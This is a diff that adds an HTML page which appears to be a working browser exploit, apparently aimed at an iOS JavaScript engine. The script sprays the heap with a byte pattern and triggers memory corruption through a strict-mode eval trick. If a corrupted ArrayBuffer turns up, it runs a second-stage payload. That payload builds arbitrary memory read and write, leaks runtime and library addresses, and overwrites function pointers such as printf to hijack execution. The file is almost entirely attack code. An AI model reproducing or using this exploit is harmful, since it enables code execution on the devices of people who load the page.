@@ -1,0 +1,39 @@
+<!doctype html><html><head><meta charset="utf-8"></head><body>
+<div id="v">N1IOS_INLINE</div>
+<script>"use strict";
+var S2="!function(){var n=0x3f4f174n,f=0x557bc20n,r=0x557af30n,t=\"N1IOS_6S_OK\\n\",e=\"START\";function i(n){e=n;try{globalThis.N1IOS=n}catch(n){}try{\"undefined\"!=typeof console&&console&&console.log&&console.log(\"N1IOS2:\"+n)}catch(n){}try{if(\"undefined\"!=typeof document&&document&&document.getElementById){var f=document.getElementById(\"v\");f&&(f.textContent=String(n))}}catch(n){}}function u(){throw new Error(\"N1IOS \"+e)}function a(n){return\"0x\"+(0xffffffffffffffffn&n).toString(16)}function o(n){return n>0x10000n&&n<0x0001000000000000n&&0n===(7n&n)}function c(n){return n>0x10000n&&n<0x0001000000000000n&&0n===(3n&n)}var x=new Uint8Array(AB);function B(n){return(x[n]|x[n+1]<<8|x[n+2]<<16|x[n+3]<<24)>>>0}function v(n){return x[n]|x[n+1]<<8}function g(n){var f=(x[n]|x[n+1]<<8|x[n+2]<<16|x[n+3]<<24)>>>0,r=(x[n+4]|x[n+5]<<8|x[n+6]<<16|x[n+7]<<24)>>>0;return BigInt(r)<<32n|BigInt(f)}for(var A=-1,N=0;N+72<=8192;N+=8)if(24===v(N+18)&&72===B(N+64)){var I=g(N+24);if(I>0x10000n&&I<0x0001000000000000n&&0n===(7n&I)){A=N;break}}if(A<0)return i(\"NO_ABV\"),u();var b=g(A+56),m=g(A+24);if(!(b>0x10000n&&0n===(7n&b)))return i(\"BAD_D\"),u();if(i(\"ABV k=\"+A+\" D=\"+a(b)),x[A+64]=255,x[A+65]=255,x[A+66]=255,x[A+67]=127,2147483647!==ABV.length)return i(\"LEN_\"+ABV.length),u();var l=b;function O(n){for(var f=0;f<8;f++)x[A+56+f]=Number(n>>BigInt(8*f)&0xffn);l=n}function V(n){var f=(ABV[n]|ABV[n+1]<<8|ABV[n+2]<<16|ABV[n+3]<<24)>>>0,r=(ABV[n+4]|ABV[n+5]<<8|ABV[n+6]<<16|ABV[n+7]<<24)>>>0;return BigInt(r)<<32n|BigInt(f)}function _(n){var f=n-l;return f>=0n&&f<0x70000000n?V(Number(f)):(O(n),V(0))}function h(n,f){var r=n-l;r>=0n&&r<0x70000000n||(O(n),r=0n);for(var t=Number(r),e=0;e<8;e++)ABV[t+e]=Number(f>>BigInt(8*e)&0xffn)}function y(n){var f=_(-8n&n),r=8*Number(7n&n);return Number(f>>BigInt(r)&0xffffffffn)>>>0}var d=function(n){var f=_(n-8n),r=Number(0xffffn&f);if(8n!==(f>>16n&0xffn)||r>=64)return 0n;var t=n-16n-80n*BigInt(r),e=_(t),i=Number(0xffn&e),u=Number(e>>32n&0xffffn);if(8!==i||u<10||u>63||r>=u)return 0n;var a,x,B,v,g,A,N,I=t-32n+16n,b=I,m=0n;for(a=0;a<4096;a++){if(!o(x=0x00ffffffffffffffn&_(b)))return 0n;if(N=!1,o(B=x-16n)&&(v=_(B+32n),g=Number(0xffn&v),A=Number(v>>32n&0xffffn),8===g&&A>=10&&A<=63&&(N=!0)),!N){m=x;break}if(x===I){m=b;break}b=x}if(0n===m)return 0n;var l,O=m-0x48n-128n&0x00ffffffffffffffn;return(l=O)>0x10000n&&0n===(0x0fn&l)&&l<0x0001000000000000n&&c(_(l+16n))&&c(_(l+24n))&&c(_(l+32n))?O:0n}(b);if(i(\"RT1=\"+a(d)),0n===d&&i(\"RT2=\"+a(d=function(){var n=_(m+48n);if(!o(n))return 0n;var f=_(n+32n);if(!o(f))return 0n;for(var r=0;r<24;r++){var t=_(f+BigInt(16*r));if(0xffffffffffffffffn===_(f+BigInt(16*r+8))&&o(t)&&12==(y(t+16n)>>>16&65535)){var e=_(t+48n);if(!o(e))continue;var i=_(e+16n);if(o(i)&&c(_(i+16n)))return i}}return 0n}())),0n===d)return i(\"NO_RT D=\"+a(b)),u();var S=_(d+16n);if(!c(S))return i(\"NO_FREE \"+a(S)),u();var E=_(d+64n),T=0n;if(n){var PP=S-BigInt(n)&0x00ffffffffffffffn;if(0n===(PP&0xfffn)&&4277009103===y(PP))T=PP;}if(0n===T)return i(\"NO_BASE js_free=\"+a(S)),u();var s=T+BigInt(f),D=T+BigInt(r);function R(n){var f=y(n)>>>0;return(2667577344&f)>>>0==2415919104||(4227858432&f)>>>0==335544320}if(!R(s))return i(\"BAD_PRINTF \"+a(s)),u();for(var k=t,w=0;w<k.length;w++)x[w]=255&k.charCodeAt(w);x[k.length]=0;new Uint8Array(4096);i(\"HOOK printf=\"+a(s)+\" rt=\"+a(d)+\" D=\"+a(b)),h(d+16n,s),h(d+64n,b);for(var ZZ=0;ZZ<64;ZZ++){new Uint8Array(4096);}try{0}catch(n){return i(\"EXC_T1\"),u()}if(h(d+16n,S),h(d+64n,E),R(D)){new Uint8Array(4096);h(d+16n,D),h(d+64n,0n);try{0}catch(n){}h(d+16n,S),h(d+64n,E)}i(\"IOS_N1_OK base=\"+a(T)+\" printf=\"+a(s)+\" rt=\"+a(d)+\" D=\"+a(b)+\" leak=\"+N1LEAK),u()}();";
+var N=3000,VK=598;
+var PAT=[0,0,0,0,1,0,0,0,255,255,0,0,255,255,255,255,255,255,255,255,255,255,255,255,1,0,0,0,255,255,255,255,255,255,255,255,255,255,255,255];
+if (globalThis.PAT !== PAT) {
+  globalThis.RESULT="RESULT NO_TOPS";
+  try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}
+} else {
+globalThis.f=(0,eval)('"use strict";(function ([] = eval("(")) { var q1=0,q2=0,q3=0; return 1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5+1.5; })');
+var S=new Array(N),fb=new Uint8Array(40);
+for(var j=0;j<40;j++)fb[j]=PAT[j];
+for(var i=0;i<N;i++){var u=new Uint8Array(957);S[i]=u;}
+var D=new Array(800);for(var i=0;i<800;i++)D[i]=new ArrayBuffer(64);
+var TN=600,T=new Array(TN),TV=new Array(TN);
+for(var i=0;i<TN;i++){T[i]=new ArrayBuffer(72);TV[i]=new Uint8Array(T[i]);}
+var PH=[4,12,20,28,36],VKS=[598,598-10,598-20,598-30,598-40];
+var hit=-1,len=0,ph=-1,vk=-1,nt=0;
+for(var pi=0;pi<5&&hit<0;pi++){
+  var p=PH[pi];
+  for(var i=0;i<N;i++){if(S[i]){for(var o=p;o+40<=957;o+=40)S[i].set(fb,o);}}
+  for(var vi=0;vi<5&&hit<0;vi++){
+    var v=VKS[vi]; if(v<16) continue;
+    for(var r=0;r<8;r++){var j=v-2*r;T[j]=null;TV[j]=null;}
+    try{f();}catch(e){}
+    nt++;
+    for(var i=0;i<TN;i++){if(T[i]!==null&&T[i].byteLength!==72){hit=i;len=T[i].byteLength;ph=p;vk=v;break;}}
+  }
+}
+if(hit>=0){globalThis.AB=T[hit];globalThis.ABV=TV[hit];globalThis.N1LEAK="FORGED";}
+globalThis.RESULT="RESULT INLINE CFIRST C=34 SZ=957 N=3000 S2LEN="+S2.length+" HIT="+hit+" LEN="+len+" PH="+ph+" VK="+vk+" NT="+nt;
+globalThis.N1MARK=globalThis.RESULT;
+try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}
+if(hit>=0){ try{(0,eval)(S2);}catch(e2){} }
+}
+</script>
+</body></html>
+<!--AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-->
